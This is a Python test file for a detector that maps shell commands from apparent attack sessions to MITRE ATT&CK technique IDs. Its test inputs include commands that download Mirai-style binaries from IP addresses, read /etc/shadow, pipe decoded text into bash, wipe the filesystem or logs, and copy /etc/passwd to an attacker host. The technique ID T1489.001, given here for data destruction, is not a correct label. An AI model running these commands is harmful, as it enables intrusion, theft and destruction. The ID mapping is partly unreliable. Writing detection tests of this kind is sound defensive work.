from attack_rules import classify_command
from rule_classifier import classify_session


def test_wget_maps_to_ingress_tool_transfer():
    assert "T1105" in classify_command("wget http://45.153.203.11/bins/mirai.arm7 -O /tmp/.x")


def test_curl_download_maps_to_ingress_tool_transfer():
    assert "T1105" in classify_command("curl -s http://185.220.101.9/x86 -o /tmp/kworker")


def test_chmod_plus_x_maps_to_permissions_modification():
    assert "T1222" in classify_command("chmod +x /tmp/.x")


def test_chmod_octal_maps_to_permissions_modification():
    assert "T1222" in classify_command("chmod 777 /tmp/kworker")


def test_cat_etc_passwd_maps_to_account_discovery():
    assert "T1087" in classify_command("cat /etc/passwd")


def test_etc_shadow_maps_to_credential_dumping():
    assert "T1003.008" in classify_command("cat /etc/shadow")


def test_uname_maps_to_system_information_discovery():
    assert "T1082" in classify_command("uname -a")


def test_ps_aux_maps_to_process_discovery():
    assert "T1057" in classify_command("ps aux")


def test_crontab_maps_to_scheduled_task():
    assert "T1053.003" in classify_command("crontab -l")


def test_base64_decode_maps_to_deobfuscate():
    assert "T1140" in classify_command("echo 'ZWNobyBoaTIK' | base64 -d | bash")


def test_history_clear_maps_to_indicator_removal_history():
    assert "T1070.003" in classify_command("history -c")


def test_rm_rf_var_log_maps_to_clear_system_logs_not_data_destruction():
    techniques = classify_command("rm -rf /var/log/*")
    assert "T1070.002" in techniques
    assert "T1489.001" not in techniques  # /var/log carve-out shouldn't double-count as destructive wipe


def test_rm_rf_root_maps_to_data_destruction():
    assert "T1489.001" in classify_command("rm -rf /")


def test_scp_to_remote_host_maps_to_exfiltration():
    assert "T1041" in classify_command("scp /etc/passwd attacker@45.153.203.11:/loot/passwd")


def test_benign_command_matches_nothing():
    assert classify_command("whoami") == []


def test_brute_force_flagged_at_three_or_more_login_attempts():
    techniques = classify_session(command_sequence=[], login_attempts=3)
    assert "T1110" in techniques


def test_brute_force_not_flagged_below_threshold():
    techniques = classify_session(command_sequence=[], login_attempts=2)
    assert "T1110" not in techniques


def test_classify_session_combines_login_and_command_signals():
    techniques = classify_session(
        command_sequence=["cat /etc/shadow", "wget http://x/y", "chmod +x y"],
        login_attempts=5,
    )
    assert set(techniques) >= {"T1003.008", "T1105", "T1110", "T1222"}


def test_classify_session_deduplicates_techniques_across_commands():
    techniques = classify_session(command_sequence=["wget http://a/b", "wget http://c/d"], login_attempts=0)
    assert techniques.count("T1105") == 1
